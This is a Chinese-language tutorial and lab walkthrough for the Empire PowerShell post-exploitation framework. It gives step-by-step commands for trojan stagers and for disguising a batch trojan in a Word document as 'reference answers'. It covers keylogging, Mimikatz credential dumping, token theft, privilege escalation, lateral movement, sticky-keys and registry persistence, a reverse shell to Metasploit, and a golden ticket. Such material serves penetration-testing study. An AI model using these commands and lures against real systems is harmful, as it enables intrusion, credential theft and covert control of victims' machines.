# 一、Empire简介
Empire是一款针对Windows平台的、使用Powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成、提权到渗透维持的一系列功能。Empire实现了无需powshell.exe就可运行Powershell代理的功能，还可以快速在后期部署漏洞利用模块，其内置模块有键盘记录、Mimikatz、绕过UAC、内网扫描等，使用能够躲避内网检测喝大部分安全防护工具的查杀，简单来说就有点类似Metasploit，是一个基于PowerShell的远程控制木马。

# 二、Empire的安装
Empire运行在Linux平台上，这里使用的系统是Kali，首先通过git命令下载程序目录。

```python
git clone https://github.com/BC-SECURITY/Empire.git
```

然后安装Empire的依赖，命令如下

```python
cd setup
pip install -r requirements.txt    # 若没有安装pip库，则需要先通过apt-get install pip进行安装
./install.sh
```

--图片--

在安装完依赖以后，返回上一级文件，启动Empire工具，命令如下：

```python
cd ..
./empire
```

若启动失败，则可能是因为依赖未完全安装好，只需要手动通过pip install xxx安装未安装好的依赖即可。

# 三、Empire的基本使用
## 3.1 帮助文档
运行Empire后，输入help命令查看具体的使用帮助。

--图片--

帮助信息中文解释如下：
| 字段信息 | 描述 |
| ------ | ----------- |
| creds | 从数据库中添加/显示凭据 |
| exit | 退出empire |
| help | 显示“帮助”菜单 |
| interact | 与特定的代理交互 |
| list | 列出活动代理或侦听器 |
| listeners | 与活跃的听众互动 |
| load | 从非标准文件夹加载 |
| plugin | 加载插件文件以扩展Empire |
| plugins | 列出所有可用的和活动的插件 |
| preobfuscate | 预混淆PowerShell模块源文件 |
| reload | 重新加载一个(或所有)empire模块 |
| report | 生成报告CSV和日志文件:会话。csv、credentials.csvmaster.log |
| reset | 重置全局选项(例如IP白名单) |
| resource | 从文件中读取并执行empire命令列表 |
| searchmodule | 搜索帝国模块名称/描述 |
| set | 设置一个全局选项(例如IP白名单) |
| show | 显示一个全局选项(例如IP白名单) |
| usemodule | 使用empire模块 |
| usestager | 使用一个empire木马 |
| uselistener | 使用一个empire监听器 |

## 3.2 设置监听
1、输入Listeners命令进入监听线程界面，按TAB键可以补全命令，按两次TAB键或者help可以显示可以利用的模块

--图片--
 
2、输入uselistener来设置采用何种监听模式，双击TBL可以看到有7种可以使用的模式。

--图片--

3、采用http监听模式，输入uselistener http，然后输入info命令查看具体参数设置。其中Require为True的值都需要被设置。与metasploit很类似

--图片--

4、通过set配置参数，并提供execeute执行

--图片--
 
到这里可以看到监听器成功创建。

5、通过back返回上一级，使用listeners或者list可以查看所设置的监听器

--图片--

6、也可以使用kill命令删除该监听器

--图片--

## 3.3 生成木马
输入usestager加两个TAB查看可以设置的木马模式

--图片--

木马就类似MSF中的payload，其中multi为通用模块，osx是Mac操作系统的模块，剩下的是Windows的模块。

这里我挑选其中的几个常用类型的木马进行具体讲解

### 3.3.1 DLL木马
1、输入usestager windows/all的命令，输入info命令查看详细参数，通过set配置参数，通过execute执行

--图片--

可以发现木马被存放在了/tmp目录下，名字为launcher.dll，内容如下：

2、在目标主机上运行木马文件，即可成功上线

### 3.3.2 launcher
1、如果只需要简单的PowerShell代码，在设置完相应模块后，可以直接在监听器菜单中键入launcher，将很快生成一行base64编码代码，这里输入back命令回到listener下，然后输入launcher powershellshuteer（当前设置的listener名字）命令来生成一个Payload。

--图片--

2、在装有Powershell的目标机上执行生成的这段命令，即可得到这个主机的权限

--图片--

### 3.3.3 launcher_vbs木马
1、输入usestager windows/launcher_vbs，然后输入info命令查看详细参数，通过set配置参数，通过execeute执行

--图片--

2、将生成的木马文件在目标机上打开，就会得到这个主机的权限

--图片--

运行木马后，主机成功上线。

--图片--

### 3.3.4 launcher_bat木马
1、输入usestager windows/launcher_vbs，然后输入info命令查看详细参数，通过set配置参数，通过execeute执行

--图片--

2、为了增加迷惑性，可以将该批处理文件插入到一个office文件中，随便找一个word或者excel文件，单击“插入对象”标签，选择“由文件创建”，单击“浏览”按钮，选择刚才的批处理文件，然后“显示为图标”，可以选“更改图标”，这里建议使用微软的Excel，Word或PowerPoint图标，使用Word的图标，并且更改文件的名称为参考答案，扩展名改为txt，单击“确定”按钮，该对象就会插入Word文件中。

--图片--

若对方点击word文件中的txt文件即可获取获得系统的控制权限。

--图片--

### 3.4 连接主机和基本使用
在目标主机反弹成功以后，可以通过agents命令列出当前已连接的主机，这里要注意带有(*)的是已提权成功的主机。如下图

--图片--

然后使用interact命令连接主机，可以使用Tab键补全主机的名称，连接成功以后可以通过rename修改会话名称，如下图：

--图片--

还可以通过help查看可以使用的命令，如下图：

--图片--

输入help agentcmds可以查看可供使用的常用命令。如下图：

--图片--

可以通过pwd查看当前目录

--图片--

通过ls查看当前目录下的文件

--图片--

也可以通过upload可以上传文件,通过cat查看文件内容

--图片--

使用某些CMD命令时，要使用”shell+命令的形式”，如下图：

--图片--

## 3.5 信息收集
Empire主要用于后渗透。所以信息收集是比较常用的一个模块，可以使用searchmodule命令搜索需要使用的模块，这里通过键如usemodule collection然后按Tab查看完整的列表，如下图：

--图片--

下面演示几个常用模块。

### 3.5.1 屏幕截图
输入以下命令即可查看该模块的具体参数，如下图：

```
usemodule collection/screenshot
info
```

--图片--

### 3.5.2 键盘记录
输入以下命令即可查看该模块的具体参数，如下图：

```
usemodule collection/keylogger
info
```

--图片--

接受到的内容将被存放在empire-master/download/<AgentName>下生成的keystrokes.txt文件中

--图片--

可以通过jobs kill JOB_name停止键盘记录

--图片--

### 3.5.3 剪贴板记录
该模块云溪用户抓取存储在目标主机Windows剪贴板的任何内容，可以设置模快参数的抓取限制和间隔时间，一般情况下，保持默认设置就可以，这里输入以下命令即可查看具体参数，如下图：

```
usemodule collection/clipboard_monitor
info
```

--图片--

也可以通过jobs kill job_name 停止当前监控模块

--图片--

### 3.5.4 查找共享
通过以下命令可以列出域内所有的共享，通过设置CheckShareAcces选项将只返回当前用户上下文中读取的共享，保持默认即可。如下图：

```
usemodule situational_awareness/network/powerview/share_finder
info
```

--图片--

### 3.5.5 收集目标主机的信息
通过以下命令可以查看本机用户、域组成员、最后的输入密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等，如下图：

```
usemodule situational_awareness/host/winenum
```

--图片--

另外还有usemodule situational_awareness/host/computerdetails模块，该模块几乎列举了系统中所有信息，如目标主机事件日志、应用程序控制策略日志，包括RDP登录信息、Powershell脚本运行和保存的信息等。在运行这模块时需要管理权限，因此需要进行提权。

--图片--

### 3.5.6 ARP扫描
Empire也内置了ARP扫描模块，输入以下命令即可使用该模块，这里要设置Range参数，如下图：

```
usemodule situational_awareness/network/arpscan
info 
set Range 1.1.1.0-1.1.1.100
```

--图片--

同样也可以使用Empire内置的端口扫描模块usemodule situational_awareness/network/portscan对端口进行扫描，这里就不再演示了。

### 3.5.7 DNS信息获取
在内网中，知道所有机器的HostName和对应的IP地址对分析内网结构至关重要，输入以下命令即可对网段内二者的对应关系进行扫描，如下图：

```
usemodule situational_awareness/network/reverse_dns
info
set Range 1.1.1.0-1.1.1.30
```

--图片--

如果该主机同时有两个网卡，Empire爷回显示出来，方便我们寻找边界主机

也可以通过另一个模块显示当前内网DNS服务器的IP地址，如下图：

--图片--

### 3.5.8 查找域管理员服务器IP
在内网渗透中，要想拿到内网中某台机器的域管权限，方法之一就是找到域管登录的机器，然后横向渗透进去，窃取域管权限，从而拿下整个域，以下这个模块就是用来查找域管登录的机器的。

```
usemodule situational_awareness/network/powerview
```

### 3.5.9 本地管理组访问模块
使用以下命令可以查看本机用户是否是域内某一台主机的本地管理员

```
usemodule situational_awareness/network/powerview/find_localadmin_access
info
```

--图片--

可以通过以下命令查看该主机C盘下的文件

```
shell dir \\win7\C$
```

--图片--

### 3.5.10 获取域控服务器
通过以下命令可以确定当前的域控制器，因为已经有了域用户权限，直接输入execute即可。

```
usemodule situational_awareness/network/powerview/get_domain_controller
info
```

--图片--

## 3.6 权限提升
提权，顾名思义就是提高自己在服务器中的权限，就比如在Windows中，你本身登陆的用户是Guest，通过提权后，就会变成超级管理员，拥有了管理Windows的所有权限。以下是常见几种提权方式：

### 3.6.1 Bypass UAC
输入以下命令，设置Listener参数，运行execute，会发现成功上线了一个新的反弹，如下图：

```
usemodule privesc/bypassuac
set Listener c1ay
```

--图片--

返回agents，通过list可以看到有一个新的会话，并且带有*，说明提权成功。

--图片--

### 3.6.2 PowerUp
Empire内置了PowerUp的部分工具，用于系统提权，主要有Windows错误系统配置漏洞、Windows Services漏洞、AlwaysInstallElevated漏洞等8种提权方式，输入以下命令，然后通过tab键查看完整列表，如下图：

```
usemodule privesc/powerup/
tab
```

--图片--

（1）AllChecks模块

查找系统中的漏洞，和PowerSploit下PowerUp中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞，输入以下命令，如下图：

```
usemodule privesc/powerup/allchecks
```

--图片--

可以看到，我们可以通过BypassUAC进行提权，可以通过以下命令：

```
usemodule privesc/bypassuac
或
bypassuac c1ay
```

--图片--

新会话返回，成功提权。

### 3.6.3 GPP
在域内常会启用组策略首选项来更改本地密码，便于管理和部署镜像，其缺点是任何普通域用户都可以从相关域控制器的SYSVOL种读取部署信息。GDD是采用ASE 256加密的，输入以下命令即可查看：

--图片--

### 3.6.4 通过溢出漏洞
输入以下命令即可通过溢出漏洞进行提权

```
usemodule privesc/ms16-032
set Listener
```

--图片--

发现新会话返回，提权成功。可以返回agents通过list查看

--图片--

# 四、横向渗透
## 4.1 令牌窃取
我们在获取服务器权限后，可以使用内置的Mimikatz获取系统密码，执行完毕后输入creds命令即可查看Empire列举的密码，如下图：

--图片--

从这里发现有域用户曾在此服务器上登录，此时可以窃取域用户身份，然后进行横向移动，首先要盗取身份，使用pth<ID>命令，这里的ID号就是creds下的CredID号，这里窃取Administrator的身份令牌，执行pth命令，如下图：

--图片--

从图中可以看到PID进程为1380，使用steal_token PID命令即可窃取该身份令牌，如图：

--图片--

同样可以输入ps命令查看是否有域用户的进程，如下图：

--图片--

可以看到存在域管理进程，这里我们可以通过steal_token命令来窃取这个令牌

--图片--

这里可以尝试访问域控的c盘，成功访问。

--图片--

输入revtoself命令可以恢复到原来的状态。

--图片--

## 4.2 会话注入
### 4.2.1 psinject
也可以通过以下命令进行进程注入，获取权限。接着设置Listener和Proc ID这连个参数，运行后就会反弹一个域用户权限shell，如下图：

```
usemodule management/psinject
set Listener c1ay
set ProcId 2144 (上面域用户的进程ID)
execute
```

--图片--

会话返回成功。

--图片--

### 4.2.2 Invoke-PsExec
通过这个模块的前提是已经获得本地管理员权限，甚至域管理员账户，然后以次进一步渗透整个内网。优点是可以直接获得system权限，缺点是该工具能呗基本得杀软检测并留下日志，而且需要开启admin$445端口共享。通过以下命令可以执行该模块。

```
usemodule lateral_movement/invoke_psexec
set ComputerName win7
set Listener c1ay
```

--图片--

一个新的会话成功反弹并且是系统权限。返回agents可以查看

--图片--

### 4.2.3 Invoke-WMI
这个模块比PsExec安全的多，所有Windows系统都启动了该服务，当攻击者使用wmiexec进行攻击时，Windwos系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无须写入磁盘，具有极高的隐秘性，但如果目标机器开启防火墙，则用WMI将无法连接上目标机器。执行如下命令可以使用该模块。

```
usemodule lateral_movement/invoke_wmi
set ComputerName win7
set Listener c1ay
execute
```

使用该模块可以获得administrator权限。

如果该主机具有其他域用户凭证，则可以进行横向移动。

--图片--

这里因为DC曾登录过本机，因此可以获得DC用户的凭证进行横向移动。

--图片--

### 4.2.4 spawn监听器
输入以下命令即可使用该模块，输入info可以查看需要配置的参数。

```
usemodule management/spawn
```

--图片--

新的会话返回，说明会话创建成功。可以返回agents，通过list查看。

--图片--

### 4.2.5 Powershell Remoting
powershell remoting是PowerShell的远程管理功能，开启Windows远程管理服务WinRM系统后会监听5985端口，该服务默认在Windows Server2012中是启动的，在Windows Server 2003/2008/2008 R2中需要手动启动。

开启方法可参考： http://www.361way.com/winrm-quickconfig/6370.html

因为在本次内网环境中，域控就是win2012，默认开启这个服务，直接通过以下命令即可得到DC权限。

```
usemodule lateral_movement/invoke_psremoting
set Listener c1ay
set ComputerName DC
```

--图片--

会话成功反弹，通过agents可以查看

--图片--

# 五、后门
后门是指绕过安全验证而获取对程序或系统访问权的方法。主要目的是方便以后再次秘密进入或控制系统。

## 5.1 权限持久性劫持Shift后门
输入如下命令即可该模块，输入info查看具体的设置信息。

```
usemodule lateral_movement/invoke_wmi_debugger
info
```

--图片--

在win7登录框连续按五次shift键即可反弹会话

--图片--

Sethc.exe可以替换成以下几项：

```
Utilman.exe（使用Win+U组合键）
Osk.exe （屏幕上的键盘：使用Win + U启动组合键）
Narrator.exe （启动讲述人：使用Win + U 启动组合键）
Magnify.exe（放大镜：使用Win + U 组合键启动）
```

## 5.2 注册表注入后门
输入如下命令即可使用该模块，该模块运行后会在目标主机启动项里增加一个命令，命令如下：

```
usemodule persistence/userland/registry
set Listener c1ay
set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run
```

--图片--

在目标机器的注册表可以看到成功增加了一个命令。

--图片--

只要目标机重启并登录后，就会反弹一个会话，如下图：

--图片--

## 5.3 计划任务获取系统权限
输入如下命令即可使用该模块，这里要设置DailyTime、Listener这两个参数，设置完后输入execute命令，到了设置的具体时间将成功返回一个高权限的shell，在实际渗透运行该模块时，杀软会提示。命令如下：

```
usemodule persistence/userland/registry
set Daily 23:58
set Listener c1ay
execute
```

--图片--

到指定时间后，会反弹一个shell。

--图片--

## 5.4 empire与MSF联动
在实际渗透中，当拿到webshell上传的MSF客户端无法绕过目标主机的杀软时，可以使用PowerShell来绕过，也可以执行Empire的Payload来绕过，成功之后再用Empire的模块将其反弹回MSF

这里使用如下命令使用该模块，设置Lhost和Lport参数即可，具体命令如下：

```
usemodule code_execution/invoke_shellcode
set Lhost 192.168.0.100
set Lport 8989
execute
```

在MSF执行如下命令：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 192.168.0.100
set LPORT 8989
run
```

--图片--

Empire的会话成功反弹到MSF上。到此MSF与empire联动就成功了。

--图片--

# 六、完整域内渗透
## 6.1 本次渗透环境

--图片--

在本次实验环境中，攻击机empire是通过ubantu搭建，中间有个防火墙，用于实现内网可能访问外网，而外网访问不了内网这个功能。内网则是由边界路由器Win2008、域控win2012和域内主机win7构成。我们首先通过web渗透获取了Win2008边界服务器的权限。

## 6.2 通过Empire获取会话
1、在Empire上开启监听模块

--图片--

2、生成木马

--图片--

3、在win2008上执行木马，获得会话

--图片--

6.3 通过arp扫描探针内网
命令如下：

```
usemodule situational_awareness/network/arpscan
set Range 1.1.1.0-1.1.1.40
```

--图片--

6.4 查找本地管理员
命令如下：

```
usemodule situational_awareness/network/powerview/find_localadmin_access
```

--图片--

该模块是用于判断本机用户是否是域内某一台主机的本地管理员。

确定是否可以访问win7的C盘

--图片--

成功获取C盘的内容

## 6.5 查找域控
命令如下：

```
usemodule situational_awareness/network/powerview/get_domain_controller
```

--图片--

发现域控叫做DC。

## 6.6 会话注入
命令如下：

```
usemodule lateral_movement/invoke_wmi    获取win7的管理员权限，是系统自带的不容易被防火墙杀软拦截
usemodule lateral_movement/invoke_psexec            获取win7的系统权限，容易留下痕迹
```

获取win7的系统权限

```
usemodule lateral_movement/invoke_psexec
set Listener C1ay
set ComputerName win7
```

--图片--

新会话返回成功。返回agents通过list可以看到已经获得win7系统权限

--图片--

## 6.7 通过steal_token窃取身份
通过ps查看该主机是否有域管理进程

--图片--

这里我们通过steal_token窃取administer的身份，窃取之后就有dc的访问权限

--图片--

查看DC的C盘目录

--图片--

通过revtoself可以恢复原来的身份

--图片--

## 6.8 通过mimikatz获取凭证
可以通过info查看权限

--图片--

当前的权限为1我们就可以用mimikatz 这个命令获取明文还有用户的一些凭证。

--图片--

我们获取之后可以用一个creds命令 查询用户凭证信息

--图片--

其中plaintext是明文密码，hash是通过加密后的密码。

## 6.9 获取域控权限
通过会话注入获取DC权限，命令如下：

```
usemodule lateral_movement/invoke_wmi
set Listener C1ay
set CredID 3
set ComputerName DC
execute
```

--图片--

新的会话上线，通过agents查看

--图片--

成功获取到域控权限。

也可以通过pth 来获取域控访问权限

## 6.10 制作黄金钥匙
1、输入mimikatz，通过creds获取凭证

--图片--

2、获取用户hash值，命令如下：

```
usemodule credentials/mimikatz/lsadump
creds
```
 
--图片--

3、制作黄金钥匙，命令如下：

```
usemodule credentials/mimikatz/golden_ticket
set credid 5
set user Administrator
execute
```

--图片--

可以看到获取黄金票据成功，时间是十年。尝试访问DC的c盘下的文件

--图片--
